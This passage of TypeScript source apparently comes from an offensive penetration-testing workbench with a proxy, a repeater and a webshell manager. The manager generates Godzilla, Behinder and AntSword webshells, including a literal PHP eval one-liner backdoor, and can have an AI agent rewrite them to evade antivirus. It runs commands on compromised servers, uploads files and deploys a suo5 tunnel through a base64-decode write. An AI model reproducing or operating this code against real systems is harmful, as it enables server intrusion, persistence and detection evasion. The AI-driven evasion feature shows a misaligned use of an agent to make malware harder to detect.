      ip: (d.ip as string) || def.ip,
      api: d.api && Number(d.api) > 0 ? Number(d.api) : def.api,
    }
  }
  /** 窗口状态（Burp 风格：记住窗口位置/大小，重启恢复）——供 electron/main.ts 使用 */
  static loadWinBounds(): { x?: number; y?: number; width?: number; height?: number } | null {
    const b = ApiServer.readConfig().winBounds as Record<string, number> | undefined
    if (!b || typeof b !== 'object') return null
    return { x: b.x, y: b.y, width: b.width, height: b.height }
  }
  static saveWinBounds(bounds: { x: number; y: number; width: number; height: number }): void {
    ApiServer.writeConfig({ winBounds: bounds })
  }
  /** 可监听 IP 选项：全部接口 / 仅本机 / 各网卡 IPv4（去重） */
  private static listenOptions(): string[] {
    const set = new Set<string>()
    try {
      const os = require('node:os') as typeof import('node:os')
      const nets = os.networkInterfaces()
      for (const list of Object.values(nets)) {
        for (const n of list || []) {
          if (n && n.family === 'IPv4' && !n.internal) set.add(n.address)
        }
      }
    } catch { /* 网卡枚举失败 */ }
    return ['0.0.0.0', '127.0.0.1', ...[...set].sort()]
  }
  /** 探测端口是否被占用（bind 试听；当前实例正在使用的端口由调用方排除） */
  private static portInUse(port: number): Promise<boolean> {
    const net = require('node:net') as typeof import('node:net')
    return new Promise((resolve) => {
      const srv = net.createServer()
      srv.once('error', () => resolve(true))
      srv.once('listening', () => srv.close(() => resolve(false)))
      srv.listen(port, '127.0.0.1')
    })
  }

  /** 从漏洞 uri 拆分出图用的 host / path（无 uri 或格式非法返回空串，不上图） */
  private splitVulnUri(uri: string): { host: string; path: string } {
    if (!uri) return { host: '', path: '' }
    const m = uri.match(/^(https?:\/\/[^/?#]+)([/?#].*)?$/i)
    if (!m) return { host: '', path: '' }
    const host = m[1] || ''
    const rawPath = m[2] || '/'
    const path = rawPath.split('?')[0] || '/'
    return { host, path }
  }

  /** 哥斯拉 PhpDynamicPayload 服务端代码（从 assets/payloads/php/payload.php 内嵌，握手时发送） */

  /** WebSocket 单发（连接 → 发送 → 收一条 → 关闭，8s 超时） */
  private wsSendOnce(url: string, payload: string): Promise<string> {
    return new Promise((resolve, reject) => {
      const ws = new WebSocket(url, { handshakeTimeout: 5000 })
      const timer = setTimeout(() => { try { ws.terminate() } catch {}; reject(new Error('WS 超时（8s 无响应）')) }, 8000)
      ws.on('open', () => ws.send(payload))
      ws.on('message', (d) => { clearTimeout(timer); try { ws.close() } catch {}; resolve(String(d)) })
      ws.on('error', (e) => { clearTimeout(timer); reject(new Error(`WS 错误: ${(e as Error).message}`)) })
      ws.on('close', () => { clearTimeout(timer) })
    })
  }

  /** Repeater：解析请求文本 → 走内置代理发送（复用上游链）→ 响应文本 + 入流量库。协议自动识别：首行 ws:// 或 wss:// 走 WebSocket，其余 HTTP/HTTPS */
  private async repeaterSend(raw: string): Promise<{ statusLine: string; headers: string[]; body: string }> {
    const text = raw.replace(/\r\n/g, '\n')
    const [head, bodyPart] = text.split('\n\n', 2)
    const lines = head.split('\n')
    // WebSocket：首行即 URL（ws:// 或 wss://），payload 在 body
    if ((lines[0] ?? '').trim().startsWith('ws://') || (lines[0] ?? '').trim().startsWith('wss://')) {
      const msg = await this.wsSendOnce(lines[0].trim(), bodyPart ?? '')
      // 重发器流量不进 HTTP 流量表（仅 WebSockets 帧历史保留）
      this.pushWs({ ts: Date.now(), direction: 'sent', payload: bodyPart ?? '', length: (bodyPart ?? '').length })
      this.pushWs({ ts: Date.now(), direction: 'received', payload: msg, length: msg.length })
      return { statusLine: 'WebSocket', headers: [], body: msg }
    }
    const [method, path, version] = (lines[0] ?? '').trim().split(/\s+/)
    if (!method || !path) throw new Error('请求行格式错误（应为: METHOD PATH HTTP/1.1）')
    const headers: Record<string, string> = {}
    for (const l of lines.slice(1)) {
      const idx = l.indexOf(':')
      if (idx > 0) headers[l.slice(0, idx).trim()] = l.slice(idx + 1).trim()
    }
    const host = headers['host'] || headers['Host']
    if (!host) throw new Error('缺少 Host 头')
    const scheme = path.startsWith('http') ? new URL(path).protocol.replace(':', '') : (path.startsWith('/') ? 'http' : 'http')
    const url = new URL(path.startsWith('/') ? `${scheme}://${host}${path}` : path)
    const body = Buffer.from(bodyPart ?? '', 'utf8')
    // 发送头：剔除 hop-by-hop + 重算 content-length
    const skip = new Set(['host', 'connection', 'proxy-connection', 'keep-alive', 'transfer-encoding', 'content-length'])
    const outHeaders: Record<string, string> = {}
    for (const [k, v] of Object.entries(headers)) if (!skip.has(k.toLowerCase())) outHeaders[k] = v
    if (body.length) outHeaders['content-length'] = String(body.length)
    // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
    const r = await this.engine.forwardInternal(url, method, outHeaders, body)
    const outLines: string[] = []
    for (const [k, v] of Object.entries(r.headers)) {
      if (k.toLowerCase() === 'rawheaders') continue
      if (Array.isArray(v)) for (const item of v) outLines.push(`${k}: ${item}`)
      else outLines.push(`${k}: ${v}`)
    }
    const resp = {
      statusLine: `HTTP/1.1 ${r.code}`,
      headers: outLines,
      body: decodeBody(r.body, (r.headers['content-encoding'] as string) || undefined),
    }
    return resp
  }

  /** Repeater：解析请求文本 → 走内置代理发送（复用上游链）→ 响应文本 + 入流量库 */
  private json(res: ServerResponse, code: number, body: unknown): void {
    const data = JSON.stringify(body)
    res.writeHead(code, { 'content-type': 'application/json; charset=utf-8', 'content-length': Buffer.byteLength(data), ...CORS })
    res.end(data)
  }

  private readBody(req: IncomingMessage): Promise<string> {
    return new Promise((resolve, reject) => {
      let b = ''
      req.on('data', (c) => {
        b += c
        if (b.length > 1 << 20) { reject(new Error('body too large')); req.destroy() }
      })
      req.on('end', () => resolve(b))
      req.on('error', reject)
    })
  }

  // ---------------- 路由领域：配置组（上游/下游/监听/项目管理/代理控制） ----------------
  private async handleConfig(req: IncomingMessage, res: ServerResponse, url: URL): Promise<void> {
    if (url.pathname === '/api/upstream' && req.method === 'PUT') {
      const body = JSON.parse(await this.readBody(req)) as Upstream
      if (!body?.type) throw new Error('missing type')
      this.engine.setUpstream(body)
      this.upstreamPersisted = true  // 用户显式配置 → 会话持久化（重启恢复）
      this.json(res, 200, { ok: true, upstream: body })
      return
    }
    if (url.pathname === '/api/downstream') {
      if (req.method === 'PUT') {
        const body = JSON.parse(await this.readBody(req)) as { host?: string; port?: number; protocol?: 'http' | 'socks5' }
        const ds = body && body.host && body.port && Number(body.port) > 0
          ? { host: String(body.host).trim(), port: Number(body.port), protocol: body.protocol === 'socks5' ? ('socks5' as const) : ('http' as const) }
          : null
        this.engine.setDownstream(ds)
        this.queueSessionSave()  // 下游代理随项目快照合并异步持久化（切换项目时随之恢复）
        this.json(res, 200, { ok: true, downstream: ds })
      } else {
        this.json(res, 200, { downstream: this.engine.getDownstream() })
      }
      return
    }
    if (url.pathname === '/api/listen') {
      if (req.method === 'PUT') {
        const body = JSON.parse(await this.readBody(req)) as { ip?: string; api?: number }
        const ip = String(body?.ip ?? '').trim()
        const options = ApiServer.listenOptions()
        if (!(ip === '0.0.0.0' || ip === '127.0.0.1' || options.includes(ip))) throw new Error(`invalid listen ip: ${ip}`)
        const api = body?.api ? Number(body.api) : this.opts.port ?? this.port
        if (!Number.isInteger(api) || api < 1 || api > 65535) throw new Error(`端口 ${body?.api} 不在合理范围（1-65535）`)
        if (api === 8899 || api === 8878) throw new Error(`端口 ${api} 与代理/终端默认端口冲突`)
        if (api !== (this.opts.port ?? this.port) && await ApiServer.portInUse(api)) throw new Error(`端口 ${api} 已被占用`)
        try { ApiServer.writeConfig({ ip, api }) } catch (e) { console.error('[pentbox] 监听配置落盘失败:', String(e).slice(0, 120)) }
        this.json(res, 200, { ok: true, ip, api, restart: true })
      } else {
        this.json(res, 200, { ...ApiServer.loadListen(), options: ApiServer.listenOptions() })
      }
      return
    }
    if (url.pathname === '/api/session/info') {
      this.json(res, 200, { path: this.currentProjectPath, savedAt: this.lastSavedAt, flows: this.flows.length, details: this.flowDetails.size, digest: this.analysisDigest.length, projects: this.listProjects() })
      return
    }
    if (url.pathname === '/api/session/save' && req.method === 'POST') {
      const b = JSON.parse(await this.readBody(req)) as { path?: string }
      await this.saveSessionNow(b.path)  // 异步落盘；传 path=另存为（内部切换当前项目）
      this.json(res, 200, { ok: true, path: this.currentProjectPath, savedAt: this.lastSavedAt })
      return
    }
    if (url.pathname === '/api/session/open' && req.method === 'POST') {
      const b = JSON.parse(await this.readBody(req)) as { path: string }
      this.openProject(b.path)
      this.json(res, 200, { ok: true, path: this.currentProjectPath, flows: this.flows.length, details: this.flowDetails.size })
      return
    }
    if (url.pathname === '/api/session/new' && req.method === 'POST') {
      const b = JSON.parse(await this.readBody(req)) as { name?: string }
      this.resetProject()  // 自动保存当前项目 + 清空
      if (b.name) {
        // 按名新建：保存到项目目录（~/.pentbox/projects/<name>.hpbs）并绑定
        const safe = String(b.name).trim().replace(/[\\/:*?"<>|]/g, '_').replace(/\.hpbs$/i, '')
        if (!safe) throw new Error('项目名无效')
        const p = join(this.projectsDir, `${safe}.hpbs`)
        this.saveSession(p)
        this.currentProjectPath = p
        this.graph.setProject(safe)
      }
      this.json(res, 200, { ok: true, path: this.currentProjectPath })
      return
    }
    if (url.pathname === '/api/proxy/stop' && req.method === 'POST') {
      await this.engine.stop()
      this.json(res, 200, { ok: true })
      return
    }
    this.json(res, 404, { error: `no route: ${req.method} ${url.pathname}` })
  }

  // ---------------- 路由领域：WebShell 管理（CRUD/执行/生成/存活/suo5） ----------------
  private async handleWebshells(req: IncomingMessage, res: ServerResponse, url: URL): Promise<void> {
    switch (url.pathname) {
        case "/api/webshells": {
          if (req.method === "GET") {
            this.json(res, 200, { items: this.webshells.map(({ password, key, ...meta }) => ({ ...meta, password: password ? "***" : "", key: key ? "***" : "" })) });
          } else if (req.method === "POST") {
            const b = JSON.parse(await this.readBody(req));
            if (!b.url) throw new Error("url \u7F3A\u5931");
            const w = { id: ++this.wsSeq, type: b.type === 'godzilla' || b.type === 'behinder' || b.type === 'antsword' ? b.type : 'behinder', script: b.script || "php", url: b.url, password: b.password || "", key: b.key || "", status: "unknown", ts: Date.now(), cryption: b.cryption || "", payload: b.payload || "", encoding: b.encoding || "UTF-8", headers: b.headers || "", reqLeft: b.reqLeft || "", reqRight: b.reqRight || "", connTimeout: b.connTimeout || 3e3, readTimeout: b.readTimeout || 6e4, remark: b.remark || "" };
            this.webshells.push(w);
            this.saveWebshells();
            this.graph.writeWebShell(w);
            this.invalidateDigestCache();
            this.broadcastGraphChange(`\u65B0 WebShell(${w.type}/${w.script}) ${w.url}`);
            this.json(res, 200, { ok: true, id: w.id });
          } else {
            this.json(res, 405, { error: "method not allowed" });
          }
          break;
        }
        case "/api/webshells/detail": {
          const id = Number(url.searchParams.get("id")) || 0;
          const w = this.webshells.find((x) => x.id === id);
          if (!w) {
            this.json(res, 404, { error: "not found" });
            break;
          }
          if (req.method === "GET") this.json(res, 200, w);
          else if (req.method === "PUT") {
            const b = JSON.parse(await this.readBody(req));
            if (b.type !== void 0) w.type = b.type;
            if (b.script !== void 0) w.script = b.script;
            if (b.url !== void 0) w.url = b.url;
            if (b.password !== void 0) w.password = b.password;
            if (b.key !== void 0) w.key = b.key;
            if (b.cryption !== void 0) w.cryption = b.cryption;
            if (b.payload !== void 0) w.payload = b.payload;
            if (b.encoding !== void 0) w.encoding = b.encoding;
            if (b.headers !== void 0) w.headers = b.headers;
            if (b.connTimeout !== void 0) w.connTimeout = b.connTimeout;
            if (b.readTimeout !== void 0) w.readTimeout = b.readTimeout;
            if (b.remark !== void 0) w.remark = b.remark;
            if (b.reqLeft !== void 0) w.reqLeft = b.reqLeft;
            if (b.reqRight !== void 0) w.reqRight = b.reqRight;
            if (b.timeout !== void 0) w.connTimeout = b.timeout;
            this.saveWebshells();
            this.graph.writeWebShell(w);
            this.invalidateDigestCache();
            this.broadcastGraphChange(`WebShell \u66F4\u65B0(${w.type}/${w.script}) ${w.url}`);
            this.json(res, 200, { ok: true });
          } else if (req.method === "DELETE") {
            const wd = this.webshells.find((x) => x.id === id);
            this.webshells = this.webshells.filter((x) => x.id !== id);
            this.saveWebshells();
            if (wd) this.graph.deleteWebShell(wd.url);
            this.json(res, 200, { ok: true });
          } else {
            this.json(res, 405, { error: "method not allowed" });
          }
          break;
        }
        case "/api/webshells/ping": {
          const b = JSON.parse(await this.readBody(req));
          const w = this.webshells.find((x) => x.id === b.id);
          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
          try {
            const r = await this.wsClient.request(w, "GET", w.url, void 0);
            w.status = r.code >= 200 && r.code < 400 ? "alive" : "dead";
            this.saveWebshells();
            this.json(res, 200, { alive: w.status === "alive", code: r.code });
          } catch (e) {
            w.status = "dead";
            this.saveWebshells();
            this.json(res, 200, { alive: false, error: (e as Error).message });
          }
          break;
        }
        case "/api/webshells/alive": {
          const b = JSON.parse(await this.readBody(req));
          const w = this.webshells.find((x) => x.id === b.id);
          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
          const r = await this.wsClient.aliveShell(w);
          w.status = r.alive ? "alive" : "dead";
          this.saveWebshells();
          this.json(res, 200, { alive: r.alive, detail: r.detail || "", error: r.error || "" });
          break;
        }
        case "/api/webshells/alive_all": {
          const results = [];
          for (const w of this.webshells) {
            const r = await this.wsClient.aliveShell(w);
            w.status = r.alive ? "alive" : "dead";
            results.push({ id: w.id, url: w.url, type: w.type, script: w.script, alive: r.alive, detail: r.detail || "", error: r.error || "" });
          }
          this.saveWebshells();
          this.json(res, 200, { results });
          break;
        }
        case "/api/webshells/fileop": {
          const b = JSON.parse(await this.readBody(req));
          const w = this.webshells.find((x) => x.id === b.id);
          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
          let pms;
          if (b.action === "list") pms = { methodName: "getFile", dirName: b.dir || "/" };
          else if (b.action === "delete") {
            // 文件删除属不可逆操作：Agent/外部调用（无用户标记）过审批官；用户手动操作免审
            if (!req.headers['x-pentbox-user']) {
              const ap = await this.approveCommand('WebShell 文件删除', w.url, `delete ${b.file || ''}`)
              if (!ap.allowed) { this.json(res, 200, { ok: false, error: `文件删除被审批拦截：${ap.reason}` }); break }
            }
            pms = { methodName: "deleteFile", fileName: b.file || "" };
          }
          else if (b.action === "read") pms = { methodName: w.script === "php" ? "readFileContent" : "readFile", fileName: b.file || "" };
          else if (b.action === "write") pms = { methodName: "uploadFile", fileName: b.file || "", fileValue: Buffer.from(b.content || "", "base64") };
          else throw new Error("\u672A\u77E5\u64CD\u4F5C");
          const buf = await this.wsClient.fileOp(w, pms);
          if (b.action === "read") this.json(res, 200, { output: buf.toString("base64") });
          else this.json(res, 200, { output: buf.toString(w.encoding || "utf8") });
          break;
        }
        case "/api/webshells/suo5": {
          const b = JSON.parse(await this.readBody(req));
          if (b.action === "status") {
            this.json(res, 200, { running: !!this.suo5Proc, port: this.suo5Proc?.port || 0, url: this.suo5Proc?.url || "" });
            break;
          }
          if (b.action === "stop") {
            if (this.suo5Proc) {
              try {
                this.suo5Proc.proc.kill();
              } catch {
              }
              this.suo5Proc = null;
            }
            this.json(res, 200, { ok: true });
            break;
          }
          const w = this.webshells.find((x) => x.id === b.id);
          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
          if (!b.url) throw new Error("\u76EE\u6807 URL \u7F3A\u5931");
          const autoType = w.script === "jsp" || w.script === "jspx" ? "jsp" : w.script === "aspx" || w.script === "asp" ? "aspx" : "php";
          const ext = b.type === "jsp" ? "jsp" : b.type === "aspx" ? "aspx" : (b.type || autoType) === "jsp" ? "jsp" : (b.type || autoType) === "aspx" ? "aspx" : "php";
          const fn = (b.name || "suo5").replace(/[\\/]/g, "") + "." + ext;
          this.log("info", `[WebShell] Suo5 正向代理部署 → ${b.url}（脚本 ${fn}）`);
          const scriptPath = join(process.cwd(), "tools", "suo5", fn);
          if (!existsSync(scriptPath)) throw new Error("\u670D\u52A1\u7AEF\u811A\u672C\u7F3A\u5931: " + scriptPath);
          const script = readFileSync(scriptPath);
          const dir = (b.dir || "/tmp").replace(/\/+$/, "");
          const target = dir + "/" + fn;
          if (w.type === "godzilla") {
            await this.wsClient.fileOp(w, { methodName: "uploadFile", fileName: target, fileValue: script });
          } else {
            const b64 = script.toString("base64");
            await this.wsClient.execShell(w, `echo ${b64} | base64 -d > ${JSON.stringify(target)}`);
          }
          const port = b.port || 1080;
          const suo5Dir = join(process.cwd(), "tools", "suo5");
          const suo5Bin = join(suo5Dir, "suo5.exe");
          if (this.suo5Proc) {
            try {
              this.suo5Proc.proc.kill();
            } catch {
            }
          }
          this.suo5Proc = { proc: spawn(suo5Bin, ["-t", b.url, "-l", "127.0.0.1:" + port], { detached: true, cwd: suo5Dir, stdio: "ignore" }), port, url: b.url };
          this.json(res, 200, { ok: true, path: target, port });
          break;
        }
        case "/api/webshells/test": {
          const b = JSON.parse(await this.readBody(req));
          if (!b.url) throw new Error("url \u7F3A\u5931");
          this.wsClient.clearCookies(b.url);
          const w = {
            id: 0,
            type: (b.type === 'godzilla' || b.type === 'behinder' || b.type === 'antsword' ? b.type : 'behinder').toLowerCase(),
            script: (b.script || "php").toLowerCase(),
            url: b.url,
            password: b.password || "",
            key: b.key || "",
            cryption: b.cryption || "",
            payload: b.payload || "",
            encoding: b.encoding || "UTF-8",
            headers: b.headers || "",
            readTimeout: b.readTimeout || 6e4
          };
          const r = await this.wsClient.aliveShell(w);
          this.json(res, 200, { alive: r.alive, detail: r.detail || "", error: r.error || "" });
          break;
        }
        case "/api/webshells/exec": {
          const b = JSON.parse(await this.readBody(req));
          const w = this.webshells.find((x) => x.id === b.id);
          if (!w) throw new Error("webshell \u4E0D\u5B58\u5728");
          if (!b.command) throw new Error("command \u7F3A\u5931");
          // 工具调用级审批：Agent/外部调用（无 x-pentbox-user 标记）过审批官；用户手动输入（带标记）免审
          if (!req.headers['x-pentbox-user']) {
            const ap = await this.approveCommand('WebShell', w.url, b.command)
            if (!ap.allowed) { this.json(res, 200, { ok: false, error: `工具调用被审批拦截：${ap.reason}` }); break }
          }
          this.log("info", `[WebShell] 执行命令: ${b.command.slice(0, 60)} @ ${w.url}`);
          try {
            const out = await this.wsClient.execShell(w, b.command);
            this.json(res, 200, { ok: true, output: out });
          } catch (e) {
            this.json(res, 200, { ok: false, error: (e as Error).message });
          }
          break;
        }
        // ---------------- WebShell 生成（参考各工具原版：哥斯拉=Payload+加密；冰蝎=AES密钥模板；蚁剑=一句话；自定义=脚本） ----------------
        case "/api/webshells/generate": {
          const b = JSON.parse(await this.readBody(req)) as { type?: string; payload?: string; script?: string; cryption?: string; password?: string; key?: string; evasion?: boolean };
          const type = (b.type || "godzilla").toLowerCase();
          const pass = (b.password || "pass").trim();
          const key = (b.key || "3c6e0b8a9c15224a").trim();
          const payload = b.payload || "PhpDynamicPayload";
          const script = (b.script || "php").toLowerCase();
          const cryption = (b.cryption || "").toLowerCase();
          const md5Key = crypto.createHash("md5").update(key, "utf8").digest("hex").slice(0, 16);
          const md5Pass = crypto.createHash("md5").update(pass, "utf8").digest("hex").slice(0, 16);
          const isRaw = cryption.includes("raw");
          const isEval = cryption.includes("eval");
          const readT = (dir: string, name: string) => {
            const p = join(process.cwd(), "assets", "payloads", dir, name);
            return existsSync(p) ? readFileSync(p, "utf8") : "";
          };
          const toUnicode = (s: string) => {
            let out = "";
            for (const ch of s) out += "\\u" + ch.charCodeAt(0).toString(16).padStart(4, "0");
            return out;
          };
          let code = "";
          let mode = "";
          let outScript = script;
          if (type === "godzilla") {
            const metaOf = (p: string) => p === "PhpDynamicPayload" ? "php" : p === "JavaDynamicPayload" ? "jsp" : p === "CShapDynamicPayload" ? "aspx" : p === "AspDynamicPayload" ? "asp" : "";
            outScript = metaOf(payload);
            if (!outScript) throw new Error(`\u672A\u77E5 payload: ${payload}`);
            if (outScript === "php") {
              const tmplName = isRaw ? "raw.bin" : isEval ? "eval.bin" : "base64.bin";
              let tmpl = readT("php", tmplName);
              if (!tmpl) throw new Error("PHP \u6A21\u677F\u7F3A\u5931");
              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
              mode = isRaw ? "XOR RAW" : isEval ? "EVAL XOR BASE64" : "XOR BASE64";
            } else if (outScript === "jsp") {
              const gTmpl = readT("java", (isRaw ? "raw" : "base64") + "GlobalCode.bin");
              const cTmpl = readT("java", (isRaw ? "raw" : "base64") + "Code.bin");
              const shellTmpl = readT("java", "shell.jsp");
              if (!gTmpl || !cTmpl || !shellTmpl) throw new Error("JSP \u6A21\u677F\u7F3A\u5931");
              const globalCode = gTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
              code = shellTmpl.replace(/\{globalCode\}/g, globalCode).replace(/\{code\}/g, codePart);
              mode = isRaw ? "JAVA AES RAW" : "JAVA AES BASE64";
            } else if (outScript === "aspx") {
              const cTmpl = isRaw ? readT("cshap", "raw.bin") : readT("cshap", "base64.bin");
              const shellTmpl = readT("cshap", "shell.aspx");
              if (!cTmpl || !shellTmpl) throw new Error("ASPX \u6A21\u677F\u7F3A\u5931");
              const codePart = cTmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
              code = shellTmpl.replace(/\{code\}/g, codePart);
              mode = isRaw ? "CSHAP AES RAW" : "CSHAP AES BASE64";
            } else if (outScript === "asp") {
              let tmpl = "";
              if (isEval) tmpl = readT("asp", "AspEvalBase64.bin");
              else if (isRaw) tmpl = readT("asp", "AspXorRaw.bin");
              else tmpl = readT("asp", "AspXorBae64.bin");
              if (!tmpl) throw new Error("ASP \u6A21\u677F\u7F3A\u5931");
              code = tmpl.replace(/\{pass\}/g, pass).replace(/\{secretKey\}/g, md5Key);
              mode = isRaw ? "ASP XOR RAW" : isEval ? "ASP EVAL BASE64" : "ASP XOR BASE64";
            }
          } else if (type === "behinder") {
            outScript = script;
            const isXor = cryption.includes("xor");
            if (isXor && script !== "php") throw new Error("\u51B0\u874E XOR \u52A0\u5BC6\u4EC5\u652F\u6301 PHP");
            const tmplMap = {
              php: isXor ? "shell_xor.php" : "shell.php",
              jsp: "shell_java9.jsp",
              jspx: "shell_uni.jsp",
              aspx: "shell.aspx",
              asp: "shell.asp"
            };
            const fname = tmplMap[script as keyof typeof tmplMap];
            if (!fname) throw new Error(`\u51B0\u874E\u6682\u4E0D\u652F\u6301\u811A\u672C ${script}`);
            const tmpl = readT("behinder", fname);
            if (!tmpl) throw new Error(`\u51B0\u874E\u6A21\u677F\u7F3A\u5931: ${fname}`);
            code = tmpl.replace(/e45e329feb5d925b/g, md5Pass);
            mode = isXor ? `XOR\uFF08\u5BC6\u94A5=md5(\u5BC6\u7801)\u524D16=${md5Pass}\uFF09` : `AES\uFF08\u5BC6\u94A5=md5(\u5BC6\u7801)\u524D16=${md5Pass}\uFF09`;
          } else if (type === "antsword") {
            outScript = script;
            const tmplMap = {
              php: "shell.php",
              jsp: "shell.jsp",
              aspx: "shell.aspx",
              asp: "shell.asp"
            };
            const fname = tmplMap[script as keyof typeof tmplMap];
            if (!fname) throw new Error(`\u8681\u5251\u6682\u4E0D\u652F\u6301\u811A\u672C ${script}`);
            const tmpl = readT("antsword", fname);
            if (!tmpl) throw new Error(`\u8681\u5251\u6A21\u677F\u7F3A\u5931: ${fname}`);
            if (script === "php") {
              code = `<?php @eval(base64_decode($_POST["shell"]));?>`;
            } else {
              code = tmpl;
            }
            mode = `\u4E00\u53E5\u8BDD\u6728\u9A6C \xB7 \u5BC6\u7801 ${pass}`;
          } else {
            throw new Error(`\u672A\u77E5\u7C7B\u578B: ${type}`);
          }
          if (b.evasion) {
            try {
              code = await this.evadeByAgent(code, outScript);
            } catch (e) {
              console.warn("[pentbox] Agent \u514D\u6740\u5931\u8D25\uFF0C\u8FD4\u56DE\u539F\u59CB\u4EE3\u7801:", String(e).slice(0, 100));
            }
          }
          this.json(res, 200, { ok: true, code, script: outScript, payload, note: `${type === "godzilla" ? payload + " \xB7 " : ""}${mode}${b.evasion ? " \xB7 \u514D\u6740" : ""}` });
          this.log("ok", `[WebShell] 生成 ${type}/${outScript}${b.evasion ? "（Agent 免杀）" : ""} · 模式 ${mode}`);
          break;
        }
    }
  }

  private async handle(req: IncomingMessage, res: ServerResponse): Promise<void> {
    const url = new URL(req.url ?? '/', `http://${req.headers.host ?? 'localhost'}`)
    if (req.method === 'OPTIONS') {
      res.writeHead(204, CORS)
      res.end()
      return
    }
    try {
      // ---- 领域路由分发（按前缀分派到领域 handler，各自处理组内路由；其余走下方 switch） ----
      if (url.pathname.startsWith('/api/webshells')) return await this.handleWebshells(req, res, url)
      if (url.pathname.startsWith('/api/upstream') || url.pathname.startsWith('/api/downstream') || url.pathname.startsWith('/api/listen') || url.pathname.startsWith('/api/session') || url.pathname.startsWith('/api/proxy/stop')) return await this.handleConfig(req, res, url)
      switch (url.pathname) {
        case '/api/approval/mode': {
          // 渗透审批模式：smart=Agent 审批渗透意见与流量；manual=仅审计流量不自动发卡（用户自主把关）
          if (req.method === 'PUT') {
            const b = JSON.parse(await this.readBody(req)) as { mode?: string }
            this.approvalMode = b.mode === 'manual' ? 'manual' : 'smart'
            ApiServer.writeConfig({ approvalMode: this.approvalMode })
            this.log('info', `[审批] 审批模式切换: ${this.approvalMode === 'smart' ? '智能（Agent 审批渗透意见与流量）' : '手动（仅审计流量，不自动发意见卡）'}`)
          }
          this.json(res, 200, { mode: this.approvalMode })
          break
        }
        case '/api/logs': {
          // 终端日志面板：增量拉取（after=上一条 seq；环形缓冲尾部兜底）
          const after = Number(url.searchParams.get('after')) || 0
          const limit = Math.min(Number(url.searchParams.get('limit')) || 300, 1000)
          const items = after > 0 ? this.logBuf.filter((x) => x.seq > after) : this.logBuf.slice(-limit)
          this.json(res, 200, { items, seq: this.logSeq })
          break
        }
        case '/api/graph/query': {
          // Agent 主动查图：默认返回图情报文本（与注入格式一致）；?format=json 返回结构化对象；?host= 只看该主机
          const fmt = url.searchParams.get('format') === 'json' ? 'json' : 'text'
          if (fmt === 'json') {
            const data = await this.graph.queryGraph(url.searchParams.get('host') || undefined)
            this.json(res, 200, { ok: true, hosts: data })
          } else {
            const txt = await this.graph.contextPrompt(url.searchParams.get('host') || undefined)
            this.json(res, 200, { ok: true, text: txt || '（Neo4j 图暂无数据）' })
          }
          break
        }
        case '/api/graph/note': {
          // Agent 主动记录情报到图（给其他 Agent 共享；非破坏性）
          const b = JSON.parse(await this.readBody(req)) as { host?: string; path?: string; text: string; level?: string; tag?: string }
          if (!b.text) throw new Error('text 缺失')
          const host = b.host || ''
          const path = b.path || ''
          this.graph.writeNote({ kind: 'note', text: String(b.text).slice(0, 400), host, path, persist: true, level: b.level || 'info', tag: b.tag || '' }).catch((e) => console.warn('[pentbox] Agent 记录入图失败:', String(e).slice(0, 100)))
          this.invalidateDigestCache()  // Agent 主动记录 → 图快照已变
          this.broadcastGraphChange(`Agent 记录 [${b.tag || 'note'}](${b.level || 'info'}) ${host}${path}: ${String(b.text).slice(0, 60)}`)
          this.json(res, 200, { ok: true })
          break
        }
        case '/api/status': {
          const u = this.engine.getUpstream()
          // 局域网地址列表（供远程 Hermes 访问本工作台；虚拟网卡可能在前，需按网段匹配）
          const nets = os.networkInterfaces()
          const lanIps = Object.values(nets).flat().filter((n: any) => n && n.family === 'IPv4' && !n.internal).map((n: any) => n.address)
          this.json(res, 200, {
            proxy: { running: true, port: this.opts.proxyPort ?? this.port },
            upstream: u,
            browser: {
              chrome: !!this.deps.chrome?.isRunning(),
              firefox: !!this.deps.firefox?.isRunning(),
            },
            mitm: this.engine.mitmEnabled,
            ssh: !!this.deps.ssh?.isConnected(),
            flows: { total: this.flows.length },
            hermes: this.hermesOnline ? 'active' : 'offline',
            lan_ip: lanIps[0] ?? '',
            lan_ips: lanIps,
          })
          break
        }
        case '/api/flows': {
          const limit = Math.min(Number(url.searchParams.get('limit')) || 50, 1000)
          const after = Number(url.searchParams.get('after')) || 0
          const q = (url.searchParams.get('q') || '').toLowerCase()
          let items = this.flows.filter((f) => f.id > after)
          if (q) items = items.filter((f) => (f.method + ' ' + f.url).toLowerCase().includes(q))
          // builtin/skipped 标记：浏览器自带与错误码流量不送 Agent，Site Map 据此排除
          items = items.map((f) => ({ ...f, builtin: !!this.analyzeMap.get(f.id)?.builtin, skipped: !!this.analyzeMap.get(f.id)?.skipped }))
          items = items.slice(-limit)
          this.json(res, 200, { items, next: items.length ? items[items.length - 1].id : after })
          break
        }
        // ---------------- 清空历史（右键菜单；删除所选条目为前端假删除——仅 HTTP History 移除，站点地图保留） ----------------
        case '/api/flows/clear': {
          this.flows = []
          this.flowDetails.clear()
          this.analyzeMap.clear()
          this.json(res, 200, { ok: true })
          break
        }
        // Agent 聚合读取：HTTP/HTTPS 流量 + WebSocket 帧一次返回；full=1 时每条带完整请求/响应报文
        case '/api/traffic': {
          const limit = Math.min(Number(url.searchParams.get('limit')) || 20, 200)
          const full = url.searchParams.get('full') === '1'
          const fmt = (line: string, raw: string[], body: string) => `${line}\n${(raw || []).join('\n')}\n\n${body || ''}`
          const http = this.flows.slice(-limit).reverse().map((f) => {
            if (!full) return f
            const d = this.flowDetails.get(f.id)
            return d ? { ...f, detail: { request: fmt(d.reqLine ?? '', d.reqRawHeaders ?? [], d.reqBody ?? ''), response: fmt(d.resLine ?? '', d.resRawHeaders ?? [], d.resBody ?? '') } } : f
          })
          const ws = this.wsFlows.slice(-limit).reverse()
          this.json(res, 200, { total: this.flows.length, wsTotal: this.wsFlows.length, http, ws })
          break
        }
        case '/api/events': {
          res.writeHead(200, {
            'content-type': 'text/event-stream',
            'cache-control': 'no-cache',
            connection: 'keep-alive',
            ...CORS,
          })
